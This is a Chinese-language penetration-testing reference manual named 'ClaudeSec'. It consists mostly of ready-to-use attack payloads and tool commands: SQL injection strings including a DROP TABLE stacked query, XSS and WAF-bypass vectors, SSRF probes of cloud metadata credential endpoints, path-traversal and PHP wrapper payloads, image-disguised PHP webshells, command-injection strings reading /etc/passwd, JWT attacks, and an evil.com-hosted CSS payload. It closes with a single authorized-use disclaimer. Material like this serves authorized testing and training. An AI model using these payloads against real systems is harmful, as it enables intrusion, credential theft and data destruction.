# ClaudeSec — 技术参考手册

> **版本**: 2.0.0
> **最后更新**: 2026-05-28
> **分类**: 安全测试技术文档

---

## 目录

1. [信息收集技术](#1-信息收集技术)
2. [漏洞检测技术](#2-漏洞检测技术)
3. [Payload 大全](#3-payload-大全)
4. [工具参数速查](#4-工具参数速查)
5. [检测规则库](#5-检测规则库)
6. [Wordlist 参考](#6-wordlist-参考)
7. [WAF 绕过技术](#7-waf-绕过技术)
8. [常见端口与服务](#8-常见端口与服务)

---

## 1. 信息收集技术

### 1.1 子域名枚举

#### Passive Sources

```
subfinder 调用源:
  - VirusTotal API
  - SecurityTrails
  - crt.sh (Certificate Transparency)
  - AlienVault OTX
  - URLScan.io
  - Shodan
  - Facebook Graph API
  - ThreatBook
  - 等 30+ 数据源

备用查询:
  - curl -s "https://crt.sh/?q=%25.example.com&output=json"
  - curl -s "https://api.threatbook.cn/v3/domain/sub_domains"
```

#### Active Bruteforce

```bash
# subfinder 暴力模式 (启用所有源)
subfinder -d example.com -all -recursive -o subs.txt

# 纯字典爆破 (配合 puredns 解决泛解析)
puredns bruteforce wordlist.txt example.com -r resolvers.txt
```

### 1.2 CDN 真实 IP 溯源

```bash
# 方法 1: 历史 DNS 记录
curl -s "https://securitytrails.com/domain/example.com/history/a"

# 方法 2: SSL 证书 IP
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u

# 方法 3: 子域名枚举找到非 CDN 子站
subfinder -d example.com | httpx -status-code | grep -v "403\|503"

# 方法 4: 全球节点 Ping
# 使用 https://check-host.net/ 或 ping.pe

# 方法 5: F5 LTM 解码
# 从 Cookie 中提取: cookies[i] 解码得到内网 IP
```

### 1.3 Google Dorks

```text
# 登录入口
site:example.com inurl:login | inurl:admin | inurl:portal

# 敏感文件
site:example.com filetype:sql | filetype:env | filetype:bak

# 配置文件
site:example.com intitle:"index of" ".env" | ".git"

# 暴露的 API
site:example.com inurl:api | inurl:rest | inurl:swagger

# 技术栈
site:example.com "powered by" | "built with" | "running on"

# 漏洞相关
site:example.com inurl:"id=" | inurl:"?page="
```

### 1.4 JavaScript 深度分析

```bash
# 1. 提取所有 JS URL
hakrawler -url https://example.com -js -depth 2 | grep "\.js$" > js_files.txt

# 2. 下载 JS 文件并提取端点
cat js_files.txt | while read url; do
    curl -s "$url" | grep -oP '"[A-Za-z0-9_/{}.-]*"' | sort -u
done

# 3. 搜索硬编码密钥模式
gf aws-keys js_files.txt       # AWS AK/SK
gf secret js_files.txt          # 通用密钥
gf base64 js_files.txt          # Base64 编码数据
gf upload js_files.txt          # 上传端点
gf debug-pages js_files.txt     # 调试路径

# 4. JS 反混淆 (如需要)
npm install -g js-beautify
js-beautify obfuscated.js > beautified.js
```

#### JS 密钥正则模式

```regex
# AWS Access Key
AKIA[0-9A-Z]{16}

# Google API Key
AIza[0-9A-Za-z\-_]{35}

# JWT Token
eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}

# GitHub Token
gh[pousr]_[A-Za-z0-9_]{36,}

# Slack Token
xox[baprs]-[0-9a-z-]{10,}
```

---

## 2. 漏洞检测技术

### 2.1 SQL 注入检测矩阵

```python
# 检测向量
DETECTION_VECTORS = {
    "error_based_mysql": [
        "'", "\"", "\\'", "\\\"",
        "1'", "1\"", "1\\'",
        "' OR '1'='1", "\" OR \"1\"=\"1",
    ],
    "time_based_mysql": [
        "1' AND SLEEP(5)-- -",
        "1' AND BENCHMARK(5000000,MD5('test'))-- -",
    ],
    "boolean_blind": [
        "1' AND '1'='1",  # True
        "1' AND '1'='2",  # False
    ],
    "union_based": [
        "' UNION SELECT NULL-- -",
        "' UNION SELECT 1,2,3-- -",
        "' UNION SELECT @@version,2,3-- -",
    ],
    "stacked_queries": [
        "1'; DROP TABLE users-- -",
    ],
}
```

#### 数据库指纹

```sql
# MySQL
-- 特征: you have an error in your SQL syntax; check ...
SELECT @@version
SELECT CONCAT(table_name) FROM information_schema.tables

# MSSQL
-- 特征: Unclosed quotation mark after the character string
SELECT @@version
SELECT table_name FROM information_schema.tables

# Oracle
-- 特征: ORA-01756: quoted string not properly terminated
SELECT banner FROM v$version
SELECT table_name FROM all_tables

# PostgreSQL
-- 特征: ERROR: syntax error at or near
SELECT version()
SELECT table_name FROM information_schema.tables

# SQLite
-- 特征: SQL logic error
SELECT sql FROM sqlite_master
```

### 2.2 XSS 上下文检测

| 上下文 | 检测 Payload | 验证方法 |
|--------|-------------|---------|
| HTML 标签间 | `<script>alert(1)</script>` | payload 原样渲染 |
| HTML 属性内 | `" onfocus=alert(1) autofocus="` | 属性断裂, 触发事件 |
| JavaScript 字符串 | `';alert(1);//` | 字符串逃逸, 语法执行 |
| CSS 上下文 | `</style><script>alert(1)</script>` | 标签闭合 |
| URL 参数 | `javascript:alert(1)` | href/src 属性触发 |

#### XSS 绕过技巧

```html
# 长度限制绕过
"onfocus=alert(1) autofocus="

# 关键字过滤绕过 (alert)
<script>prompt(1)</script>
<script>confirm(1)</script>
<script>eval('al'+'ert(1)')</script>
<script>location=atob('YWxlcnQoMSk=')</script>
<script>(1,alert)`1`</script>

# 括号过滤绕过
<script>alert`1`</script>
<script>alert document.domain</script>
<svg onload=alert`1`>

# 引号过滤绕过
<script>alert(1)</script>       <!-- 不需要引号 -->
<svg onload=alert(1)>           <!-- 数字不需要引号 -->
<img src=x onerror=alert(/xss/)>

# WAF 绕过编码
<script>eval(atob('YWxlcnQoMSk='))</script>
%3Cscript%3Ealert(1)%3C/script%3E  <!-- URL 编码 -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;  <!-- HTML 实体 -->
```

### 2.3 SSRF 检测与利用

#### 内网地址探测

```text
# IPv4 内网
http://127.0.0.1
http://10.0.0.1
http://172.16.0.1
http://192.168.1.1
http://0.0.0.0

# IPv6 回环
http://[::1]
http://[0:0:0:0:0:ffff:127.0.0.1]

# 特殊地址
http://0x7f000001    # 十六进制
http://2130706433     # 整数形式
http://017700000001   # 八进制
http://0x7f.0x0.0x0.0x1

# DNS 重绑定
http://1e100.net      # Google IP
http://spoofed.burpcollaborator.net
```

#### 云元数据端点

```text
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# 阿里云
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/user-data/

# 腾讯云
http://metadata.tencentyun.com/latest/meta-data/

# 华为云
http://169.254.169.254/openstack/latest/
```

### 2.4 SSTI 检测

| 模板引擎 | 检测字符串 | 识别特征 |
|---------|-----------|---------|
| Jinja2 (Python) | `{{7*7}}` | 49 |
| Twig (PHP) | `{{7*7}}` | 49 |
| Freemarker (Java) | `${7*7}` | 49 |
| Velocity (Java) | `#set($x=7*7)$x` | 49 |
| JSP EL | `${7*7}` | 49 |
| Thymeleaf | `[[${7*7}]]` | 49 |
| Mako (Python) | `${7*7}` | 49 |
| Smarty (PHP) | `{$smarty.now}` | 时间戳数字 |
| ERB (Ruby) | `<%= 7*7 %>` | 49 |
| Nunjucks (Node) | `{{7*7}}` | 49 |

### 2.5 JWT 攻击

```bash
# 步骤 1: 解码 JWT
jwt_tool <token> -T   # 显示 token 内容

# 步骤 2: 算法攻击
jwt_tool <token> -X a  # alg:none 攻击
jwt_tool <token> -X k  # kid 注入攻击
jwt_tool <token> -X j  # JKU 注入攻击

# 步骤 3: 弱密钥爆破
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt

# 步骤 4: 混淆攻击 (RS256 → HS256)
jwt_tool <token> -X misCrack -I -pc <payload_claim> -pv <value>
```

---

## 3. Payload 大全

### 3.1 LFI/RFI

```text
# 基本路径遍历
../../../etc/passwd
..\\..\\..\\windows\\win.ini
....//....//....//etc/passwd

# 编码绕过
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252f..%252fetc/passwd        # 双层编码
..%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd  # UTF-8 过编码

# 截断绕过
../../../etc/passwd%00.jpg
../../../etc/passwd%00
../../../etc/passwd.

# 包装器 (PHP)
php://filter/read=convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=/etc/passwd
php://input (POST: <?php system('id'); ?>)
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOw==
```

### 3.2 文件上传绕过

```text
# Content-Type 绕过
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

# 扩展名绕过
.php .php3 .php4 .php5 .phtml .phar
.jsp .jspx .jspf
.asp .aspx .cer .asa
.cgi .pl

# 大小写绕过
.Php .pHp .PHP .PhP

# 双扩展名
.jpg.php .php.jpg .php.jpeg

# 尾部特殊字符
.php%00.jpg .php. .php%20 .php;.jpg

# 内容绕过 (图片马)
GIF89a<?php system($_GET['cmd']); ?>
\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>
```

### 3.3 命令注入

```text
# 命令拼接
; id
| id
|| id
& id
&& id
`id`
$(id)

# 绕过过滤
;cat /etc/passwd
;cat$IFS/etc/passwd           # $IFS 代替空格
;c''at /etc/passwd            # 单引号分隔
;c""at /etc/passwd            # 双引号分隔
;cat /etc/pa""sswd
;who{ami}                     # 花括号
;${PATH:0:1}usr${PATH:0:1}bin${PATH:0:1}id

# 编码执行
;echo 'aWQ=' | base64 -d | sh
;${@/l%20/a}                  # 环境变量构造
```

---

## 4. 工具参数速查

### nmap

```bash
# 快速全端口扫描
nmap -sS -T4 --min-rate=10000 -p- <target> -oN fast_scan.txt

# 服务版本检测
nmap -sC -sV -O -T4 -p <ports> <target> -oA detailed

# NSE 漏洞扫描
nmap --script=vuln -p <ports> <target> -oN vulns.txt

# HTTP 安全头检测
nmap --script=http-security-headers -p 80,443 <target>

# 避开防火墙
nmap -sS -sA -Pn -D RND:10 --spoof-mac 0 <target>
```

### ffuf

```bash
# 目录枚举
ffuf -u https://target.com/FUZZ -w wordlist.txt -c

# 带扩展名
ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.asp,.aspx,.jsp

# 递归扫描
ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2

# POST 参数 fuzz
ffuf -u https://target.com/login -X POST \
  -d "username=FUZZ&password=test" -w usernames.txt

# 参数发现
ffuf -u https://target.com/api?FUZZ=1 -w params.txt -fs 42

# 请求头 fuzz
ffuf -u https://target.com/ -H "X-Forwarded-For: FUZZ" -w ips.txt
```

### dirsearch

```bash
# 基础扫描
dirsearch -u https://target.com

# 指定扩展名
dirsearch -u https://target.com -e php,asp,txt,zip,bak,env

# 递归扫描
dirsearch -u https://target.com -r -R 2

# 排除状态码
dirsearch -u https://target.com -x 403,404,500

# 指定字典
dirsearch -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### subfinder

```bash
# 基础模式
subfinder -d example.com -o subs.txt

# 递归子域名
subfinder -d example.com -all -recursive

# 使用 API Key
subfinder -d example.com -all -o subs.txt -config ~/.config/subfinder/provider-config.yaml

# 只输出活跃子域名 (pip 到 httpx)
subfinder -d example.com | httpx -status-code -title
```

---

## 5. 检测规则库

### 5.1 敏感文件检测

```text
# 配置文件
/.env
/.env.production
/.env.local
/config.php
/config.php.bak
/db.config
/database.yml
/application.properties
/config.json
/settings.py

# 版本控制
/.git/config
/.git/HEAD
/.svn/entries
/.hg/store

# API 文档
/swagger/
/swagger-ui.html
/api/docs
/v1/swagger.json
/openapi.json
/api/swagger/

# 备份文件
/backup.sql
/dump.sql
/www.zip
/www.tar.gz
/web.rar
/source.zip
```

### 5.2 CORS 检测

```bash
# 测试 Origin 反射
curl -H "Origin: https://evil.com" -I https://target.com/api

# 期望的响应:
Access-Control-Allow-Origin: https://evil.com     # ← 漏洞！
Access-Control-Allow-Credentials: true            # ← 高危！
```

### 5.3 安全头检查清单

```python
SECURITY_HEADERS = {
    "Strict-Transport-Security": "HSTS 未启用",
    "Content-Security-Policy": "CSP 未配置",
    "X-Content-Type-Options": "nosniff 缺失",
    "X-Frame-Options": "SAMEORIGIN 或 DENY",
    "X-XSS-Protection": "1; mode=block",
    "Referrer-Policy": "strict-origin-when-cross-origin",
    "Permissions-Policy": "建议配置",
    "Set-Cookie: HttpOnly": "Cookie 缺少 HttpOnly",
    "Set-Cookie: Secure": "Cookie 缺少 Secure",
    "Set-Cookie: SameSite": "Cookie 缺少 SameSite",
}
```

---

## 6. Wordlist 参考

### 推荐字典来源

```text
# 目录枚举
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
https://github.com/danielmiessler/SecLists

# 子域名
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

# 密码
/usr/share/wordlists/rockyou.txt (解压: gunzip rockyou.txt.gz)

# 参数
https://github.com/s0md3v/Arjun/tree/master/arjun/db
```

### 常用状态码过滤

```
200: OK (成功)
201: Created (创建成功)
204: No Content (成功但无响应体)
301: Moved Permanently (重定向)
302: Found (临时重定向)
304: Not Modified
400: Bad Request
401: Unauthorized (需要认证)
403: Forbidden (禁止访问)
404: Not Found
405: Method Not Allowed
500: Internal Server Error
502: Bad Gateway
503: Service Unavailable
```

---

## 7. WAF 绕过技术

### 7.1 WAF 识别

```bash
# 标准识别
wafw00f https://target.com

# 手工识别
curl -s -H "User-Agent: () { :; }; /bin/bash -c 'id'" https://target.com
grep -i "cloudflare\|mod_security\|akamai\|sucuri\|safe3" <<< $(curl -sI https://target.com)
```

### 7.2 常见 WAF 产品

| WAF | 厂商 | 识别特征 |
|-----|------|---------|
| Cloudflare | Cloudflare | 响应头: `cf-ray`, `server: cloudflare` |
| AWS WAF | Amazon | 403: `RequestBlocked` |
| ModSecurity | Open Source | 响应头: `Mod_Security` |
| Akamai | Akamai | 错误页面: `AkamaiGHost` |
| F5 BIG-IP | F5 | Cookie: `BIGipServer` |
| SafeLine | 长亭科技 | 错误页面特征 |
| Alibaba WAF | 阿里云 | 响应头: `aliyungf_t` |

### 7.3 SQL 注入 WAF 绕过

```sql
# 注释符替换
--  →  #  →  --+  →  -- -  →  /*!*/

# 关键字替换
OR → ||  AND → &&  UNION → UN/**/ION

# 空白字符替换
%09 (Tab)  %0a (Newline)  %0d (CR)  %0c (FF)

# 操作符替换
= → LIKE → IN → BETWEEN → <>

# 布尔盲注替换
AND 1=1 → AND 1 LIKE 1 → AND 'a'='a'
```

### 7.4 XSS WAF 绕过

```html
# Unicode 编码
<scrīpt>alert(1)</script>

# HTML 实体编码
&#x3C;img src=x onerror=alert(1)&#x3E;

# 双编码
%253Cscript%253Ealert(1)%253C/script%253E

# 混合编码
<scr<script>ipt>alert(1)</scr</script>ipt>

# CSS 注入绕过
<link rel="stylesheet" href="//evil.com/xss.css">
```

---

## 8. 常见端口与服务

| 端口 | 服务 | 常见漏洞 |
|------|------|---------|
| 21 | FTP | 匿名登录, 弱口令 |
| 22 | SSH | 弱口令, 已知版本漏洞 |
| 23 | Telnet | 明文传输, 弱口令 |
| 25 | SMTP | 邮件中继, 用户枚举 |
| 53 | DNS | 区域传输, DNS 劫持 |
| 80 | HTTP | Web 漏洞 (通用) |
| 443 | HTTPS | Web 漏洞 (通用) |
| 389 | LDAP | 匿名绑定, 注入 |
| 445 | SMB | EternalBlue, 空会话 |
| 636 | LDAPS | LDAP 注入 |
| 873 | Rsync | 匿名访问, 文件泄露 |
| 993 | IMAPS | 弱口令 |
| 995 | POP3S | 弱口令 |
| 1080 | SOCKS | 代理滥用 |
| 1352 | Lotus Notes | 默认凭据 |
| 1433 | MSSQL | 弱口令, SA 提权 |
| 1521 | Oracle | 弱口令, TNS 注入 |
| 2049 | NFS | 无限制挂载 |
| 2375 | Docker API | 未授权访问 |
| 3306 | MySQL | 弱口令, 版本漏洞 |
| 3389 | RDP | BlueKeep, 弱口令 |
| 5432 | PostgreSQL | 弱口令, 版本漏洞 |
| 5900 | VNC | 无口令认证 |
| 6379 | Redis | 未授权访问, 写 SSH |
| 8080 | HTTP-Proxy | 开放代理 |
| 8443 | HTTPS-Alt | Web 漏洞 |
| 9000 | SonarQube | 默认凭据 |
| 9090 | WebLogic | 反序列化 |
| 9200 | Elasticsearch | 未授权访问 |
| 11211 | Memcached | 未授权访问 |
| 27017 | MongoDB | 未授权访问 |

---

> **免责声明**: 本文档仅用于安全研究和授权的测试活动。所有技术内容应在获得明确授权后使用。
